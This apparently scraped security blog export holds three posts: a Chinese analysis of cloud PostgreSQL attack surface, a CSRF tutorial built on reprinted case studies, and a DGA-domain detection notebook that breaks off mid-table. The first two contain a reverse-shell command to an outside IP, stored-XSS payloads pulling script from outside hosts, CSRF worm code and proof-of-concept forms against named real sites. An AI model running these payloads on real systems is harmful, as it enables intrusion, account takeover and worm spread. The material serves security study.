PostgreSQL攻击面分析","url":"/Cloud%20Native%20PostgreSQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/","content":"\n\n本文以Azure为例，简单叙述下在学习云环境下PostgreSQL的过程和几个有趣漏洞\n\n\n一、Azure PostgreSQL基本情况和攻击面分析1. Azure PostgreSQL基本情况侦查\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nERROR:  permission denied for function lo_export\nERROR:  permission denied for table pg_largeobject\n\n插件列表\n&quot;xml2&quot;&quot;1.1&quot;&quot;XPath querying and XSLT&quot;&quot;citext&quot;&quot;1.6&quot;&quot;data type for case-insensitive character strings&quot;&quot;file_fdw&quot;&quot;1.0&quot;&quot;foreign-data wrapper for flat file access&quot;&quot;postgis_sfcgal&quot;&quot;3.2.0&quot;&quot;PostGIS SFCGAL functions&quot;&quot;pg_qs&quot;&quot;2.2&quot;&quot;Query Store&quot;&quot;pg_prewarm&quot;&quot;1.2&quot;&quot;prewarm relation data&quot;&quot;insert_username&quot;&quot;1.0&quot;&quot;functions for tracking who changed a table&quot;&quot;amcheck&quot;&quot;1.3&quot;&quot;functions for verifying relation integrity&quot;&quot;sslinfo&quot;&quot;1.2&quot;&quot;information about SSL certificates&quot;&quot;pglogical_origin&quot;&quot;1.0.0&quot;&quot;Dummy extension for compatibility when upgrading from Postgres 9.4&quot;&quot;intarray&quot;&quot;1.5&quot;&quot;functions, operators, and index support for 1-D arrays of integers&quot;&quot;bloom&quot;&quot;1.0&quot;&quot;bloom access method - signature file based index&quot;&quot;postgis_topology&quot;&quot;3.2.0&quot;&quot;PostGIS topology spatial types and functions&quot;省略.......\n\n\n2. 攻击面分析可以将攻击面分成三类，分别是PostgreSQL自身漏洞、PostgreSQL功能特性漏洞、PostgreSQL二次开发漏洞。\nPostgreSQL自身漏洞1 参考官方漏洞列表，利用较多的为CVE-2020-25695、CVE-2019-9193等\n\nPostgreSQL功能特性导致漏洞1 高危函数限制不严格，例如上文中提到的这些；\n\n2 用户角色/权限设计不合理，例如不加限制的授予用户CREATEROLE权限等\n\nPostgreSQL二次开发导致漏洞1 在云上，CSP需要允许用户某些功能，但是要限制其不安全的操作，这就需要对权限模型进行二次开发，可能造成漏洞；\n\n2 不安全的API也是云上最大的风险之一，注入、糟糕的访问控制等\n\n二、有趣漏洞1. Azure Database for PostgreSQL漏洞1Step1. Azure二次开发PostgreSQL，以强化其特权模型并添加新功能，通过寻找二次开发的导致的漏洞，将普通账号提升至特权账号superuser，进而实现命令执行获得宿主容器权限；Step2. 在服务的内部网络中执行侦察，发现可以通过网络访问子网中的其他客户实例；Step3. 进一步侦查发现，PostgreSQL 提供了一项独特的功能，允许将数据库数据从一台服务器复制到另一台服务器，从而“复制”数据库。这通常用于备份和故障转移/高可用性方案；Step4. 从 Certificate Transparency 提要中检索目标的公用名；Step5. 从 DigiCert 或 DigiCert 中间证书颁发机构购买特制证书；Step6. 通过解析数据库域名并将其与 Azure 的公共 IP 范围之一匹配来查找目标的 Azure 区域；Step7. 扫描目标实例的子网并利用漏洞获得读取权限。\n2. Azure Database for PostgreSQL漏洞2Step1. Azure 对 PostgreSQL 引擎进行了一些修改，以便在云中提供 PostgreSQL 即服务；Step2. Azure PostgreSQL 授予用户CREATEROLE权限，但没有限制角色以防止其被滥用；Step3.CREATE USER james CREATEDB IN GROUP pg_read_server_files,pg_write_server_files,pg_execute_server_program ROLE postgres;\n\nStep4.SET ROLE “james”;COPY shell_results FROM program &#x27;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/13.33.33.7/1337 0&gt;&amp;1&quot;&#x27;;Step5. \n\n\n3. GCP Database for PostgreSQL漏洞1Step1. GCP 对引擎引入的一项修改允许cloudsqlsuperuser角色将表的所有权任意更改为数据库中的任何用户或角色;Step2. 发现对表执行上述任何命令都会隐式调用具有表所有者权限的索引函数;Step3.创建一个新表。向表中插入一些虚拟内容，以便索引函数可以使用。在表上创建一个恶意索引函数（使用我们的代码执行负载）。将表所有者更改为 cloudsqladmin ，即 GCP 的超级用户角色，仅供 Cloud SQL 用于维护和管理数据库。ANALYZE table，强制 PostgreSQL 引擎将 user-context 切换到 table 的所有者（ cloudsqladmin ）并以 cloudsqladmin 权限调用恶意索引函数，导致执行我们之前没有权限执行的 shell 命令。\n\nStep4. 权限提升（非常牛逼，建议看原文）参考：\nhttp://tttang.com/archive/1547/\nhttps://www.postgresql.org/about/newsarchive/security/\nhttps://www.wiz.io/blog/wiz-research-discovers-extrareplica-cross-account-database-vulnerability-in-azure-postgresql\nhttps://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities\nhttps://staaldraad.github.io/post/2020-12-15-cve-2020-25695-postgresql-privesc/\nhttps://www.postgresql.org/support/security/ \n","categories":["云安全"],"tags":["Cloud"]},{"title":"Cross-site request forgery","url":"/Cross-site%20request%20forgery/","content":"0x00 什么是CSRFCSRF：Cross-Site Request Forgery，跨站请求伪造\n在OWASP中是这样说的\n一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求,包括该用户的会话cookie和其他认证信息,发送到一个存在漏洞的web应用程序。这就允许了攻击者迫使用户浏览器向存在漏洞的应用程序发送请求,而这些请求会被应用程序认为是用户的合法请求\n\n0x01 CSRF攻击分类\nGET\n\n请求是个GET请求，请求中没有token验证和referer验证，然后还有一个固定的变量可以被控制\n\n\nPOST\n\n请求是个POST请求，请求中没有token参数，也没有验证referer\n\n\nPOST-&gt;GET\n\n请求是个POST请求，请求中没有token参数，但是验证了referer。然而可以将post请求改写为get请求，然后通过第一种的情况进行利用\n\n\nCSRF+XSS\n\n传说中的“黄金搭档”\n\n\nFLASH CSRF\n\nFlash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF说真的，在学习这个之前还真不知道crossdomain.xml这个文件的作用\n\n0x02 CSRF的主要危害\n篡改目标网站上的用户数据\n\n盗取用户隐私数据\n\n作为其他攻击向量的辅助攻击手法\n\n传播CSRF蠕虫\n\n\n0x03 CSRF案例解析\n华为商城某处CSRF可修改安全邮箱\n\n漏洞点http://www.vmall.com/member/updateEmail.json?email=xxxx@xxx.com\n\n\n然后就可以修改绑定邮箱，然后通过邮箱修改密码，登录帐号\n\n新浪微博CSRF点链接关注\n\n\n这里uid可以是任意用户\n利用burp简单构造poc\n&lt;form action=&quot;http://movie.weibo.com/feed/relation/index/?fajtype=follow&quot; method=&quot;POST&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;uid&quot; value=&quot;1944519257&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;&lt;/form&gt;\n\n\n\n新浪微博CSRF之点我链接发微博\n\n\n\nhttp://wanwan.sina.com.cn.llunull.tk/a.php\n此处构造poc\n&lt;form action=&quot;http://wanwan.sina.com.cn/t_sina/event/sxd.php&quot; method=&quot;get&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;e&quot; value=&quot;5&quot; /&gt;&lt;input type=&quot;text&quot; name=&quot;img&quot; value=&quot;http://wanwan.sina.com.cn.llunull.tk/sina_csrf.php&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;text&quot; value=&quot;hello,[email protected]://wanwan.sina.com.cn.llunull.tk/a.php&quot; /&gt;&lt;input type=&quot;text&quot; name=&quot;ra&quot; value=&quot;&quot;&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;&lt;/form&gt;\n\n\n\n\n某通用cms添加后台管理员的CSRF漏洞\n\n添加后台管理员请求如下：\n\n然后将post请求改成get也可以成功发包。\nhttp://127.0.0.1/asp/Survey/admin/Admin.asp?Username=test222&amp;Password1=123456&amp;Password2=123456&amp;action=yes\n\n万达电影主站xss+csrf又是蠕虫\n\n电影的评论处存在存储型xss\npayload：&lt;img src=x onerror=$[&#39;get\\123cript&#39;](&#39;//20.rs&#39;) width=0&gt;\n\nCSRF的蠕虫代码\nvar url=&quot;http://www.wandafilm.com/user/comment.do?m=addFilmComment&quot;;var sendata = &quot;filmId=20140507033232512405&amp;commentContent=%3Cimg+src%3Dx+onerror%3D%24%5B&#x27;get\\\\123cript&#x27;%5D(&#x27;%2F%2Fkm3.pw&#x27;)+width%3D0%3E&amp;cmType=0&amp;code=&quot;;if (window.XMLHttpRequest)&#123;var xmlhttp1=new XMLHttpRequest();&#125;else&#123;var xmlhttp1=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);&#125;xmlhttp1.open(&quot;POST&quot;,url,true);xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp1.send(sendata);\nfilmId是想要蔓延过去的电影ID的值，只需要改变电影ID就可以实现蠕虫的蔓延，当然这只是测试了\n\n百度某站可结合CSRF及XSS劫持账号\n\n在百度词典-我的词典处，有将生词添加进生词本的功能，在备注的时候没有进行过滤，可以直接插入JavaScript代码。\n一个“SELF-XSS”,只能跨自己，有什么用呢？\n考虑利用CSRF来触发这个XSS\n构造POC：\n#!html&lt;html&gt;&lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;form id=&quot;baidu&quot; name=&quot;baidu&quot; action=&quot;http://dict.baidu.com/wordlist.php&quot; method=&quot;POST&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;req&quot; value=&quot;add&quot; /&gt;        &lt;input type=&quot;text&quot; name=&quot;word&quot; value=&quot;Wooyun&quot; /&gt;        &lt;input type=&quot;text&quot; name=&quot;explain&quot; value=&quot;&lt;script src=http://xsserme&gt;&lt;/script&gt;&quot; /&gt;        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;    &lt;/form&gt;    &lt;script&gt;        document.baidu.submit();    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n诱惑受害者访问该页面\n已经成功添加了一个新单词“Wooyun”\n代码成功执行\n[来源wooyun]\n\nflash csrf自动设置自己的密保邮箱\n\n当一个访客访问伪造链接的时候，自动设置自己的密保邮箱。\n申请保密邮箱，浏览器向服务端发送了一个POST请求，请求地址和参数为：POST:xxx.xxx.xx/xx.jsp?userid=xxxx&amp;mail=dddd@dddd.com\n之前测试保密邮箱得知服务端没有验证Referer，但是页面验证了Token，所以就可以直接把POST数据包中的请求地址，参数名，参数值，Token值取出来用于伪造绑定保密邮箱的请求。\n利用代码：\n#!as3package &#123;    import flash.display.Sprite;    import flash.events.Event;    import flash.net.*;    import flash.text.TextField;    public class url extends Sprite    &#123;        public function url()        &#123;            //获取当前页面userid/token            var echo_txt:TextField = new TextField();            var targetURL:String = &quot;http://xx.xx.cc&quot;;            var request:URLRequest = new URLRequest(targetURL);            request.method = URLRequestMethod.GET;            request.data = &quot;&quot;;            sendToURL(request);            var loader:URLLoader=new URLLoader();            loader.addEventListener(Event.COMPLETE,completeHandler);            function completeHandler(event:Event):void&#123;            var userid:String=((loader.data+&quot;&quot;).match(/\\/xxxx\\/mxxxx\\.php\\?xxid=(\\d+)/)||[&quot;&quot;,&quot;&quot;])[1]; var masthash:String=((loader.data+&quot;&quot;).match(/\\/xxxx\\/mxxxx\\.php\\?masthash=(\\d+)/)||[&quot;&quot;,&quot;&quot;])[1];            echo_txt.text =  masthash;            //伪造申请密保邮箱POST请求            var emailtargetURL:String = &quot;http://xxxxxx.xx.cc/xxxx/xxxx.jsp?mark=send&quot;;            var emailrequest:URLRequest = new URLRequest(emailtargetURL);            emailrequest.method = URLRequestMethod.POST;            var postdata:Object = new Array();            postdata[0]=&quot;xxxx=xxxx@xxx.cc&amp;xxxx=&quot;+xxxxx&amp;&quot;xxxxx=&quot;+xxx;            emailrequest.data = postdata[0];            sendToURL(emailrequest);            &#125;            loader.load(request);        &#125;    &#125;&#125;\n\n现在可以注册一个新邮箱测试一下了\n[来源wooyun]\n0x04 CSRF的防御token校验\n0x05 CSRF总结只要够猥琐，一个小洞也能上天\n","categories":["WEB安全"],"tags":["CSRF"]},{"title":"DGA Domain Detection","url":"/DGA%20Domain%20Detection/","content":"\n0x01 Domain Generating AlgorithmDomain generation algorithms (DGA) are algorithms seen in various families of malware that are used to periodically generate a large number of domain names that can be used as rendezvous points with their command and control servers. \nExample\n\nTorpig\nZeusBot\nCryptolocker\nNecurs\nSymmi\nRanbyus\n\n0x02 Random Forestrandom forest = bagging + decision trees\n0x03 code\nRandom Forest\n\nMultinomialNB\n\n\nimport os, sysimport tracebackimport jsonimport optparseimport pickleimport collectionsimport sklearnimport sklearn.feature_extractionimport sklearn.ensembleimport sklearn.metricsimport pandas as pdimport numpy as npimport tldextractimport mathimport operatorfrom sklearn.model_selection import train_test_splitfrom matplotlib import pylabfrom pylab import *\n\n收集数据\nalexa_dataframe = pd.read_csv(&#x27;data/alexa_100k.csv&#x27;, names=[&#x27;rank&#x27;,&#x27;uri&#x27;], header=None, encoding=&#x27;utf-8&#x27;)alexa_dataframe.info()alexa_dataframe.head()\n\n&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;\nRangeIndex: 100000 entries, 0 to 99999\nData columns (total 2 columns):\nrank    100000 non-null int64\nuri     100000 non-null object\ndtypes: int64(1), object(1)\nmemory usage: 1.5+ MB\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      rank\n      uri\n    \n  \n  \n    \n      0\n      1\n      facebook.com\n    \n    \n      1\n      2\n      google.com\n    \n    \n      2\n      3\n      youtube.com\n    \n    \n      3\n      4\n      yahoo.com\n    \n    \n      4\n      5\n      baidu.com\n    \n  \n\n\n\n\n\n\ndga_dataframe = pd.read_csv(&#x27;data/dga_domains.txt&#x27;, names=[&#x27;raw_domain&#x27;], header=None, encoding=&#x27;utf-8&#x27;)dga_dataframe.info()dga_dataframe.head()\n\n&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;\nRangeIndex: 2669 entries, 0 to 2668\nData columns (total 1 columns):\nraw_domain    2669 non-null object\ndtypes: object(1)\nmemory usage: 20.9+ KB\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      raw_domain\n    \n  \n  \n    \n      0\n      04055051be412eea5a61b7da8438be3d.info\n    \n    \n      1\n      1cb8a5f36f.info\n    \n    \n      2\n      30acd347397c34fc273e996b22951002.org\n    \n    \n      3\n      336c986a284e2b3bc0f69f949cb437cb.info\n    \n    \n      4\n      336c986a284e2b3bc0f69f949cb437cb.org\n    \n  \n\n\n\n\n\n\nword_dataframe = pd.read_csv(&#x27;data/words.txt&#x27;, names=[&#x27;word&#x27;], header=None, dtype=&#123;&#x27;word&#x27;: np.str&#125;, encoding=&#x27;utf-8&#x27;)word_dataframe.info()word_dataframe.head(10)\n\n&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;\nRangeIndex: 479623 entries, 0 to 479622\nData columns (total 1 columns):\nword    479619 non-null object\ndtypes: object(1)\nmemory usage: 3.7+ MB\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      word\n    \n  \n  \n    \n      0\n      1080\n    \n    \n      1\n      10-point\n    \n    \n      2\n      10th\n    \n    \n      3\n      11-point\n    \n    \n      4\n      12-point\n    \n    \n      5\n      16-point\n    \n    \n      6\n      18-point\n    \n    \n      7\n      1st\n    \n    \n      8\n      2\n    \n    \n      9\n      20-point\n    \n  \n\n\n\n\n\n准备数据\ndef domain_extract(uri):    ext = tldextract.extract(uri)    if (not ext.suffix):        return None    else:        return ext.domain    alexa_dataframe[&#x27;domain&#x27;] = [ domain_extract(uri) for uri in alexa_dataframe[&#x27;uri&#x27;]]del alexa_dataframe[&#x27;rank&#x27;]del alexa_dataframe[&#x27;uri&#x27;]alexa_dataframe = alexa_dataframe.dropna()alexa_dataframe = alexa_dataframe.drop_duplicates()alexa_dataframe.info()alexa_dataframe.head()\n\n&lt;class &#39;pandas.core.frame.DataFrame&#39;&gt;\nInt64Index: 91377 entries, 0 to 99999\nData columns (total 1 columns):\ndomain    91377 non-null object\ndtypes: object(1)\nmemory usage: 1.4+ MB\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n    \n  \n  \n    \n      0\n      facebook\n    \n    \n      1\n      google\n    \n    \n      2\n      youtube\n    \n    \n      3\n      yahoo\n    \n    \n      4\n      baidu\n    \n  \n\n\n\n\n\n\nalexa_dataframe[&#x27;class&#x27;] = &#x27;legit&#x27;#对正常数据打标legitalexa_dataframe.head()\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      class\n    \n  \n  \n    \n      0\n      facebook\n      legit\n    \n    \n      1\n      google\n      legit\n    \n    \n      2\n      youtube\n      legit\n    \n    \n      3\n      yahoo\n      legit\n    \n    \n      4\n      baidu\n      legit\n    \n  \n\n\n\n\n\n\n# Shuffle the data (important for training/testing)alexa_dataframe = alexa_dataframe.reindex(np.random.permutation(alexa_dataframe.index))#打乱循序，重新索引#Randomly permute a sequence, or return a permuted rangealexa_total = alexa_dataframe.shape[0]print(&#x27;Total Alexa domains %d&#x27; % alexa_total)\n\nTotal Alexa domains 91377\n\ndga_dataframe[&#x27;domain&#x27;] = dga_dataframe.applymap(lambda x: x.split(&#x27;.&#x27;)[0].strip().lower())#This method applies a function that accepts and returns a scalar to every element of a DataFrame.del dga_dataframe[&#x27;raw_domain&#x27;]\n\n\n\n\ndga_dataframe = dga_dataframe.dropna()dga_dataframe = dga_dataframe.drop_duplicates()dga_total = dga_dataframe.shape[0]print(&#x27;Total DGA domains %d&#x27; % dga_total)\n\nTotal DGA domains 2664\n\ndga_dataframe[&#x27;class&#x27;] = &#x27;dga&#x27;dga_dataframe.head()\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      class\n    \n  \n  \n    \n      0\n      04055051be412eea5a61b7da8438be3d\n      dga\n    \n    \n      1\n      1cb8a5f36f\n      dga\n    \n    \n      2\n      30acd347397c34fc273e996b22951002\n      dga\n    \n    \n      3\n      336c986a284e2b3bc0f69f949cb437cb\n      dga\n    \n    \n      5\n      40a43e61e56a5c218cf6c22aca27f7ee\n      dga\n    \n  \n\n\n\n\n\ndef entropy(s):    &#x27;&#x27;&#x27;    熵计算    &#x27;&#x27;&#x27;    p, lns = collections.Counter(s), float(len(s))    return -sum( count/lns * math.log(count/lns, 2) for count in p.values())\n\n\nall_domains = pd.concat([alexa_dataframe, dga_dataframe], ignore_index=True)#将数据根据不同的轴作简单的融合#如果两个表的index都没有实际含义，使用ignore_index=Trueall_domains[&#x27;length&#x27;] = [len(x) for x in all_domains[&#x27;domain&#x27;]]all_domains = all_domains[all_domains[&#x27;length&#x27;] &gt; 6]#排除短domain的干扰all_domains[&#x27;entropy&#x27;] = [entropy(x) for x in all_domains[&#x27;domain&#x27;]]all_domains.head(10)\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      class\n      length\n      entropy\n    \n  \n  \n    \n      0\n      facebook\n      legit\n      8\n      2.750000\n    \n    \n      2\n      youtube\n      legit\n      7\n      2.521641\n    \n    \n      5\n      wikipedia\n      legit\n      9\n      2.641604\n    \n    \n      10\n      blogspot\n      legit\n      8\n      2.750000\n    \n    \n      11\n      twitter\n      legit\n      7\n      2.128085\n    \n    \n      12\n      linkedin\n      legit\n      8\n      2.500000\n    \n    \n      19\n      wordpress\n      legit\n      9\n      2.725481\n    \n    \n      23\n      microsoft\n      legit\n      9\n      2.947703\n    \n    \n      27\n      xvideos\n      legit\n      7\n      2.807355\n    \n    \n      28\n      googleusercontent\n      legit\n      17\n      3.175123\n    \n  \n\n\n\n\n\n分析数据\n#箱线图all_domains.boxplot(&#x27;length&#x27;,&#x27;class&#x27;)pylab.ylabel(&#x27;Domain Length&#x27;)all_domains.boxplot(&#x27;entropy&#x27;,&#x27;class&#x27;)pylab.ylabel(&#x27;Domain Entropy&#x27;)\n\n\n\n\nText(0,0.5,&#39;Domain Entropy&#39;)\n\n\n\ncond = all_domains[&#x27;class&#x27;] == &#x27;dga&#x27;dga = all_domains[cond]alexa = all_domains[~cond]plt.scatter(alexa[&#x27;length&#x27;], alexa[&#x27;entropy&#x27;], s=140, c=&#x27;#aaaaff&#x27;, label=&#x27;Alexa&#x27;, alpha=.2)plt.scatter(dga[&#x27;length&#x27;], dga[&#x27;entropy&#x27;], s=40, c=&#x27;r&#x27;, label=&#x27;DGA&#x27;, alpha=.3)plt.legend()#放置图例pylab.xlabel(&#x27;Domain Length&#x27;)pylab.ylabel(&#x27;Domain Entropy&#x27;)\n\n\n\n\nText(0,0.5,&#39;Domain Entropy&#39;)\n\n\nall_domains.tail(10)\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      class\n      length\n      entropy\n    \n  \n  \n    \n      94031\n      xcfwwghb\n      dga\n      8\n      2.750000\n    \n    \n      94032\n      xcgqdfyrkgihlrmfmfib\n      dga\n      20\n      3.684184\n    \n    \n      94033\n      xclqwzcfcx\n      dga\n      10\n      2.646439\n    \n    \n      94034\n      xcpfxzuf\n      dga\n      8\n      2.500000\n    \n    \n      94035\n      xcvxhxze\n      dga\n      8\n      2.405639\n    \n    \n      94036\n      xdbrbsbm\n      dga\n      8\n      2.405639\n    \n    \n      94037\n      xdfjryydcfwvkvui\n      dga\n      16\n      3.500000\n    \n    \n      94038\n      xdjlvcgw\n      dga\n      8\n      3.000000\n    \n    \n      94039\n      xdrmjeu\n      dga\n      7\n      2.807355\n    \n    \n      94040\n      xflrjyyjswoatsoq\n      dga\n      16\n      3.500000\n    \n  \n\n\n\n\n\n\nlegit = all_domains[(all_domains[&#x27;class&#x27;]==&#x27;legit&#x27;)]max_grams = np.maximum(legit[&#x27;alexa_grams&#x27;],legit[&#x27;word_grams&#x27;])ax = max_grams.hist(bins=80)ax.figure.suptitle(&#x27;Histogram of the Max NGram Score for Domains&#x27;)pylab.xlabel(&#x27;Number of Domains&#x27;)pylab.ylabel(&#x27;Maximum NGram Score&#x27;)\n\n\n\n\nText(0,0.5,&#39;Maximum NGram Score&#39;)\n\n\nword_dataframe = word_dataframe[word_dataframe[&#x27;word&#x27;].map(lambda x: str(x).isalpha())]word_dataframe = word_dataframe.applymap(lambda x: str(x).strip().lower())word_dataframe = word_dataframe.dropna()word_dataframe = word_dataframe.drop_duplicates()word_dataframe.head(10)\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      word\n    \n  \n  \n    \n      37\n      a\n    \n    \n      48\n      aa\n    \n    \n      51\n      aaa\n    \n    \n      53\n      aaaa\n    \n    \n      54\n      aaaaaa\n    \n    \n      55\n      aaal\n    \n    \n      56\n      aaas\n    \n    \n      57\n      aaberg\n    \n    \n      58\n      aachen\n    \n    \n      59\n      aae\n    \n  \n\n\n\n\n\n\nalexa_vc = sklearn.feature_extraction.text.CountVectorizer(analyzer=&#x27;char&#x27;, ngram_range=(3,5), min_df=1e-4, max_df=1.0)#词袋模型统计词频#ngram_range：词组切分的长度范围#如果一个词的频率小于min_df或者大于max_df，将不会被作为关键词counts_matrix = alexa_vc.fit_transform(alexa_dataframe[&#x27;domain&#x27;])#生成词频向量#fit_transform 计算各个词语出现的次数alexa_counts = np.log10(counts_matrix.sum(axis=0).getA1())#数据归一化print(alexa_counts[:10])ngrams_list = alexa_vc.get_feature_names()#从包含文本和图片的数据集中提取特征，转换成机器学习中可用的数值型特征print(ngrams_list[:10])_sorted_ngrams = sorted(zip(ngrams_list, alexa_counts), key=operator.itemgetter(1), reverse=True)#zip()将两个序列合并，返回zip对象，可强制转换为列表或字典# sorted()对序列进行排序，返回一个排序后的新列表，原数据不改变print(&#x27;Alexa NGrams: %d&#x27; % len(_sorted_ngrams))for ngram, count in _sorted_ngrams[:10]:    print(ngram, count)\n\n[1.         1.         1.17609126 1.64345268 1.11394335 1.14612804\n 1.         1.17609126 1.07918125 1.54406804]\n[&#39;-20&#39;, &#39;-a-&#39;, &#39;-ac&#39;, &#39;-ad&#39;, &#39;-ads&#39;, &#39;-af&#39;, &#39;-ag&#39;, &#39;-ai&#39;, &#39;-air&#39;, &#39;-al&#39;]\nAlexa NGrams: 23613\ning 3.443888546777372\nlin 3.4271614029259654\nine 3.399673721481038\ntor 3.26528962586083\nter 3.2631624649622166\nion 3.2467447097238415\nent 3.228913405994688\npor 3.2013971243204513\nthe 3.2005769267548483\nree 3.16345955176999\n\n#提取词的数值型特征dict_vc = sklearn.feature_extraction.text.CountVectorizer(analyzer=&#x27;char&#x27;, ngram_range=(3,5), min_df=1e-5, max_df=1.0)counts_matrix = dict_vc.fit_transform(word_dataframe[&#x27;word&#x27;])dict_counts = np.log10(counts_matrix.sum(axis=0).getA1())ngrams_list = dict_vc.get_feature_names()print(ngrams_list[:10])\n\n[&#39;aaa&#39;, &#39;aab&#39;, &#39;aac&#39;, &#39;aad&#39;, &#39;aaf&#39;, &#39;aag&#39;, &#39;aah&#39;, &#39;aai&#39;, &#39;aak&#39;, &#39;aal&#39;]\n\n_sorted_ngrams = sorted(zip(ngrams_list, dict_counts), key=operator.itemgetter(1), reverse=True)print(&#x27;Word NGrams: %d&#x27; % len(_sorted_ngrams))for ngram, count in _sorted_ngrams[:10]:    print(ngram, count)\n\nWord NGrams: 123061\ning 4.387300822448285\ness 4.204879333760662\nati 4.1933472563864616\nion 4.165036479994566\nter 4.162415036106447\nnes 4.112504458767161\ntio 4.076822423342773\nate 4.0723602039634885\nent 4.069631102620343\ntion 4.0496056125949735\n\ndef ngram_count(domain):    &#x27;&#x27;&#x27;    domain中包含的ngrams数    &#x27;&#x27;&#x27;    alexa_match = alexa_counts * alexa_vc.transform([domain]).T      dict_match = dict_counts * dict_vc.transform([domain]).T    print(&#x27;%s Alexa match:%d Dict match: %d&#x27; % (domain, alexa_match, dict_match))\n\n\nngram_count(&#x27;google&#x27;)ngram_count(&#x27;facebook&#x27;)ngram_count(&#x27;1cb8a5f36f&#x27;)ngram_count(&#x27;pterodactylfarts&#x27;)\n\ngoogle Alexa match:17 Dict match: 14\nfacebook Alexa match:31 Dict match: 27\n1cb8a5f36f Alexa match:0 Dict match: 0\npterodactylfarts Alexa match:35 Dict match: 76\n\n#Compute NGram matches for all the domains and add to our dataframeall_domains[&#x27;alexa_grams&#x27;]= alexa_counts * alexa_vc.transform(all_domains[&#x27;domain&#x27;]).Tall_domains[&#x27;word_grams&#x27;]= dict_counts * dict_vc.transform(all_domains[&#x27;domain&#x27;]).Tall_domains.head(10)\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n.dataframe tbody tr th &#123;\n    vertical-align: top;\n&#125;\n\n.dataframe thead th &#123;\n    text-align: right;\n&#125;\n\n\n\n  \n    \n      \n      domain\n      class\n      length\n      entropy\n      alexa_grams\n      word_grams\n    \n  \n  \n    \n      0\n      facebook\n      legit\n      8\n      2.750000\n      31.302278\n      27.872426\n    \n    \n      2\n      youtube\n      legit\n      7\n      2.521641\n      25.855170\n      18.287142\n    \n    \n      5\n      wikipedia\n      legit\n      9\n      2.641604\n      24.571024\n      29.175635\n    \n    \n      10\n      blogspot\n      legit\n      8\n      2.750000\n      24.435141\n      19.274501\n    \n    \n      11\n      twitter\n      legit\n      7\n      2.128085\n      23.244500\n      31.130820\n    \n    \n      12\n      linkedin\n      legit\n      8\n      2.500000\n      24.774916\n      32.904408\n    \n    \n      19\n      wordpress\n      legit\n      9\n      2.725481\n      38.369509\n      33.806635\n    \n    \n      23\n      microsoft\n      legit\n      9\n      2.947703\n      32.133033\n      39.530125\n    \n    \n      27\n      xvideos\n      legit\n      7\n      2.807355\n      28.906360\n      18.846834\n    \n    \n      28\n      googleusercontent\n      legit\n      17\n      3.175123\n      67.315750\n      86.104683\n    \n  \n\n\n\n\n\n\n#Use the vectorized operations of the dataframe to investigate differencesall_domains[&#x27;diff&#x27;] = all_domains[&#x27;alexa_grams&#x27;] - all_domains[&#x27;word_grams&#x27;]all_domains.sort_values([&#x27;diff&#x27;], ascending=True).head(10)\n\n\n\n\n\n\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    